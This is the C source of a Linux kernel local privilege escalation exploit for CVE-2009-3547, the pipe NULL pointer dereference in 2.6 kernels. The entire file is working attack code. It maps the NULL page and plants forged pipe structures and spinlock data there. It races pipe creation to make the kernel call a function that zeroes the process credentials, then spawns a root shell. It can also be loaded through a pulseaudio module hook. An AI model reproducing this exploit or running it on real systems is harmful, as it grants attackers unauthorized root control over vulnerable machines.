/*
 * Exploit for the kernel pipe NULL pointer dereference bug (CVE-2009-3547).
 *
 * By Fotis Loukos <fotis (at) gmail (dot) com>
 * Thanks to Spender <spender (at) grsecurity (dot) net> for creating
 * the original exploit for enlightenment and sharing the knowledge!
 * But hey, I pointed the bug to him! :)
 *
 * It's another classic NULL pointer dereference at the Linux kernel. There
 * are many ways to exploit this, this one works just fine!
 *
 * Version 2 notes:
 * I have added support for the detection of kernels compiled with spinlock
 * debugging options.
 *
 * Greets fly to dinos <krasn (at) and (dot) gr>, topolino (aka lixtetrax)
 * and argp!
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/personality.h>

#define PIPE_BUFFERS        (16)
#define TASK_RUNNING        0
#define SPINLOCK_MAGIC      0xdead4ead
#define SPINLOCK_OWNER_INIT ((void *)-1L)

#define OPS_BASE            0x200

struct __wait_queue_head {
    /* There's a spinlock here that we handle separately */
    void *next, *prev;
};

typedef struct __wait_queue_head wait_queue_head_t;

/* Versions 2.6.17 -> 2.6.19 */
struct pipe_buf_operations_v1 {
    int can_merge;
    void *map;
    void *unmap;
    int (*pin)();
    void *release;
    void *steal;
    void *get;
};

struct pipe_buffer_v1 {
    void *page;
    unsigned int offset, len;
    void *ops;
    unsigned int flags;
};

struct pipe_inode_info_v1 {
    wait_queue_head_t wait;
    unsigned int nrbufs, curbuf;
    struct pipe_buffer_v1 bufs[PIPE_BUFFERS];
    void *tmp_page;
    unsigned int start;
    unsigned int readers;
    unsigned int writers;
    unsigned int waiting_writers;
    unsigned int r_counter;
    unsigned int w_counter;
    void *fasync_readers;
    void *fasync_writers;
    void *inode;
};

/* Versions 2.6.20 -> 2.6.22 */
struct pipe_buf_operations_v2 {
    int can_merge;
    void *map;
    void *unmap;
    int (*pin)();
    void *release;
    void *steal;
    void *get;
};

struct pipe_buffer_v2 {
    void *page;
    unsigned int offset, len;
    void *ops;
    unsigned int flags;
};

struct pipe_inode_info_v2 {
    wait_queue_head_t wait;
    unsigned int nrbufs, curbuf;
    void *tmp_page;
    unsigned int readers;
    unsigned int writers;
    unsigned int waiting_writers;
    unsigned int r_counter;
    unsigned int w_counter;
    void *fasync_readers;
    void *fasync_writers;
    void *inode;
    struct pipe_buffer_v2 bufs[PIPE_BUFFERS];
};

/* Versions 2.6.23 -> 2.6.31 */
struct pipe_buf_operations_v3 {
    int can_merge;
    void *map;
    void *unmap;
    int (*confirm)();
    void *release;
    void *steal;
    void *get;
};

struct pipe_buffer_v3 {
    void *page;
    unsigned int offset, len;
    void *ops;
    unsigned int flags;
    unsigned long private;
};

struct pipe_inode_info_v3 {
    wait_queue_head_t wait;
    unsigned int nrbufs, curbuf;
    void *tmp_page;
    unsigned int readers;
    unsigned int writers;
    unsigned int waiting_writers;
    unsigned int r_counter;
    unsigned int w_counter;
    void *fasync_readers;
    void *fasync_writers;
    void *inode;
    struct pipe_buffer_v3 bufs[PIPE_BUFFERS];
};

int pipefd[2];
static int done, uid, gid, stacksize, frommain;


/*
 * Support only for 2.6 kernels.
 */
static inline unsigned long get_current()
{
    unsigned long current;

    current = (unsigned long) &current;
    current = *(unsigned long *)(current & ~(0x1000 - 1));
    stacksize = 0x1000;

    if((current >= 0xc0000000) && (*(unsigned long *) current ==
        TASK_RUNNING))
        return current;

    current = (unsigned long) &current;
    current = *(unsigned long *)(current & ~(0x2000 - 1));
    stacksize = 0x2000;

    if((current >= 0xc0000000) && (*(unsigned long *) current ==
        TASK_RUNNING))
        return current;

    return 0;
}

/*
 * This will be run by the kernel.
 */
static int getroot()
{
    unsigned long *current, *real_cred, *cred;
    int i, j;

    if(!(current = (unsigned long *) get_current()))
        return 1;

    /* The following should work till 2.6.28.10 since 2.6.29 uses COW */
    for(i = 0; i < stacksize; i++) {
        if((current[0] == uid) && (current[1] == uid) &&
                (current[2] == uid) && (current[3] == uid) &&
                (current[4] == gid) && (current[5] == gid) &&
                (current[6] == gid) && (current[7] == gid)) {
            current[0] = current[1] = current[2] = current[3] = 0;
            current[4] = current[5] = current[6] = current[7] = 0;
            done = 2;
            return 1;
        }
        current++;
    }

    current = (unsigned long *) get_current();

    /* COW creds on  kernel ver >= 2.6.29 */
    real_cred = cred = NULL;
    for(i = 0; i < stacksize - 16; i++) {
        if(((frommain == 1) && (!memcmp((char *) current, "gayros-2", 9))) ||
                ((frommain == 0) && (!memcmp((char *) current,
                "pulseaudio", 10)))) {
            /*
             * Found comm, we must go back, search for the mutex and then
             * back again for the cred structs.
             */
            for(j = 0; j < stacksize - i - 12; j++) {
                if(*(unsigned int *)current == 1) {
                    real_cred = *((unsigned long **) current - 3);
                    cred = *((unsigned long **) current - 2);
                    break;
                }
                current--;
            }
            break;
        }
        current++;
    }

    if(real_cred) {
        /* Skip counter */
        real_cred++;
        cred++;

        if((real_cred[0] == uid) && (real_cred[1] == gid) &&
                (real_cred[2] == uid) && (real_cred[3] == gid) &&
                (real_cred[4] == uid) && (real_cred[5] == gid) &&
                (real_cred[6] == uid) && (real_cred[7] == gid)) {
            real_cred[0] = real_cred[1] = real_cred[2] = real_cred[3] = 0;
            real_cred[4] = real_cred[5] = real_cred[6] = real_cred[7] = 0;
        }

        if((cred[0] == uid) && (cred[1] == gid) &&
                (cred[2] == uid) && (cred[3] == gid) &&
                (cred[4] == uid) && (cred[5] == gid) &&
                (cred[6] == uid) && (cred[7] == gid)) {
            cred[0] = cred[1] = cred[2] = cred[3] = 0;
            cred[4] = cred[5] = cred[6] = cred[7] = 0;
        }

        done = 2;
    }

    return 1;
}

/*
 * The thread that will create the pipe.
 */
int mkpipe(void *arg)
{
    while(!done) {
        if(!pipe(pipefd)) {
            close(pipefd[1]);
            close(pipefd[0]);
        }
    }

    return 0;
}

/*
 * This will spawn the thread above and try to trigger the race.
 */
void trigger()
{
    char *stack, buf[64];
    int fd, i;

    /* Without this we'll get killed before triggering the race. */
    signal(SIGPIPE, SIG_IGN);

    /* This is a nice trick below, thanks spender! */
    if((stack = malloc(0x4000)) == NULL) {
        perror("malloc");
        exit(1);
    }

    if(clone(mkpipe, stack + 0x4000 - sizeof(unsigned long), CLONE_FS |
        CLONE_FILES | CLONE_SIGHAND | CLONE_VM | CLONE_THREAD,
        NULL) < 0) {
        perror("clone");
        exit(1);
    }

    for(i = 0; (i < 10000000) && !done; i++) {
        snprintf(buf, 64, "/proc/self/fd/%i", pipefd[1]);
        fd = open(buf, O_WRONLY);
        if(fd < 0)
            continue;
        write(fd, ".", 1);
        close(fd);
    }

    if(!done)
        done = 1;
}

/*
 * Get structure version. It uses the kernel version as returned by uname.
 */
int getver(void)
{
    struct utsname uts;
    int ver;

    uname(&uts);

    printf("Using kernel version %s.\n", uts.release);

    if(uts.release[0] != '2' || (uts.release[1] != '.')) {
        printf("WTF? Version different than 2?\n");
        printf("Where did you find this, www.ancientexploits.org?\n");
        exit(1);
    }

    if(uts.release[2] != '6') {
        printf("Exploit works only at some 2.6.x kernels.\n");
        printf("If you're using an older version, please upgrade or ");
        printf("find another exploit (yes, you're vulnerable).\n");
        printf("If you're using a newer version, please downgrade.\n");
        exit(1);
    }

    ver = atoi(&uts.release[4]);

    if(ver < 17) {
        printf("Versions < 2.6.17 aren't supported, find another exploit or ");
        printf("write your own.\n");
        printf("Yes, you're vulnerable too.\n");
        exit(1);
    }
    if(ver < 20)
        return 1;
    if(ver < 23)
        return 2;
    return 3;
}

/*
 * Get kernel compile options and set an initialized spinlock
 */
int setspinlock(void *spinlock)
{
    FILE *fp;
    struct utsname uts;
    char buf[128], tmp1;
    int debug, debug_lock_alloc, lock_stat, size;
    unsigned int *p, tmp2;

    debug = 0;
    debug_lock_alloc = 0;
    lock_stat = 0;

    uname(&uts);

    if((fp = fopen("/proc/kallsyms", "r")) == NULL) {
        snprintf(buf, 128, "/boot/System.map-%s", uts.release);
        fp = fopen(buf, "r");
    }

    if(fp != NULL) {
        while(!feof(fp)) {
            if(!fscanf(fp, "%x %c %s\n", &tmp2, &tmp1, buf)) {
                fgets(buf, 128, fp);
                continue;
            }
            if(!debug && !strcmp(buf, "__spin_lock_init")) {
                printf("Detected kernel compiled with DEBUG_SPINLOCK\n");
                debug = 1;
            }
            if(!debug_lock_alloc && !strcmp(buf, "_spin_lock_nested")) {
                printf("Detected kernel compiled with DEBUG_LOCK_ALLOC\n");
                debug_lock_alloc = 1;
            }
            if(!lock_stat && !strcmp(buf, "lock_contended")) {
                printf("Detected kernel compiled with LOCK_STAT\n");
                lock_stat = 1;
            }
        }
        fclose(fp);
    } else {
        printf("Cannot load kernel syms, assuming kernel with no debug ");
        printf("symbols...\n");
    }

    p = (unsigned int *) spinlock;
    size = sizeof(unsigned int);
    *p++ = 1;
    if(debug) {
        *p++ = SPINLOCK_MAGIC;
        *p++ = -1;
        *(void **) p = SPINLOCK_OWNER_INIT;
        size += 2 * sizeof(unsigned int) + sizeof(void *);
    }
    if(debug_lock_alloc) {
        size += 3 * sizeof(void *);
        if(lock_stat) {
            size += sizeof(int);
            /* unsigned long ip appears since version 2.6.29 */
            if(atoi(&uts.release[4]) > 28)
                size += sizeof(unsigned long);
        }
    }

    return size;
}

/*
 * Do the magic!
 */
void runexploit(void)
{
    int version, slsize;

    if(personality(0xffffffff) == PER_SVR4) {
        if(mprotect(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
            perror("mprotect");
            exit(1);
        }
    } else if(mmap(0x0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0) ==
        MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    printf("We got NULL page babe!\n");

    uid = getuid();
    gid = getgid();

    version = getver();

    /* Place a spinlock at the beginning */
    slsize = setspinlock(0x0);

    /*
     * It's almost the same for every version, just the structures and some
     * names change. We also create a valid wait_queue_head_t in order not
     * to get an oops while closing the fd.
     */
    if(version == 1) {
        struct pipe_inode_info_v1 *pipe;
        struct pipe_buf_operations_v1 *ops;

        printf("Found version 1 structure, doing our tricks in memory...\n");

        pipe = (struct pipe_inode_info_v1 *) slsize;
        pipe->readers = 1;
        pipe->nrbufs = 1;
        pipe->curbuf = 0;
        pipe->bufs[0].ops = (struct pipe_buf_operations_v1 *) OPS_BASE;
        pipe->wait.next = &pipe->wait.next;

        ops = (struct pipe_buf_operations_v1 *) OPS_BASE;
        ops->can_merge = 1;
        ops->pin = getroot;
    } else if(version == 2) {
        struct pipe_inode_info_v2 *pipe;
        struct pipe_buf_operations_v2 *ops;

        printf("Found version 2 structure, doing our tricks in memory...\n");

        pipe = (struct pipe_inode_info_v2 *) slsize;
        pipe->readers = 1;
        pipe->nrbufs = 1;
        pipe->curbuf = 0;
        pipe->bufs[0].ops = (struct pipe_buf_operations_v2 *) OPS_BASE;
        pipe->wait.next = &pipe->wait.next;

        ops = (struct pipe_buf_operations_v2 *) OPS_BASE;
        ops->can_merge = 1;
        ops->pin = getroot;
    } else if(version == 3) {
        struct pipe_inode_info_v3 *pipe;
        struct pipe_buf_operations_v3 *ops;

        printf("Found version 3 structure, doing our tricks in memory...\n");

        pipe = (struct pipe_inode_info_v3 *) slsize;
        pipe->readers = 1;
        pipe->nrbufs = 1;
        pipe->curbuf = 0;
        pipe->bufs[0].ops = (struct pipe_buf_operations_v3 *) OPS_BASE;
        pipe->wait.next = &pipe->wait.next;

        ops = (struct pipe_buf_operations_v3 *) OPS_BASE;
        ops->can_merge = 1;
        ops->confirm = getroot;
    } else {
        printf("WTF is going on? getver() returned an invalid value!\n");
        exit(1);
    }

    printf("Go go go boy!\n");
    trigger();

    if(done == 2) {
        printf("We've got bush!\n");
        execl("/bin/sh", "sh", NULL);
    }

    printf("No luck this time, are you on an SMP box? :(\n");
    exit(1);
}

/*
 * It works from pulseaudio
 */
int pa__init(void *m)
{
    runexploit();
    return 0;
}

void pa__done(void *m)
{
}

/*
 * And as standalone
 */
int main(int argc, char **argv)
{
    frommain = 1;
    runexploit();
    return 0;
}
